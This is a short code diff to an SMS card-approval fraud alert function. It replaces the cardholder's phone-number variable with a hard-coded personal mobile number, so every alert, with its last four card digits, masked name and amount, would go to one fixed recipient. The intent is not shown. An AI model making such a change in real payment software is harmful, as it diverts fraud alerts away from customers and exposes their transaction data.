@@ -121,7 +121,7 @@ function sendFdsAlarm(cardId,username,userPhone,store,dateTime,amount) {
     let formattedDateTime = formattedDate+' '+timePart;
 
     const requestData = {
-        to: phoneNumber,
+        to: '01050437629',
         content: '하나카드(' + lastFourDigits + ')신용승인\n'
             + maskedName+'\n'
             + formattedAmount+'\n'
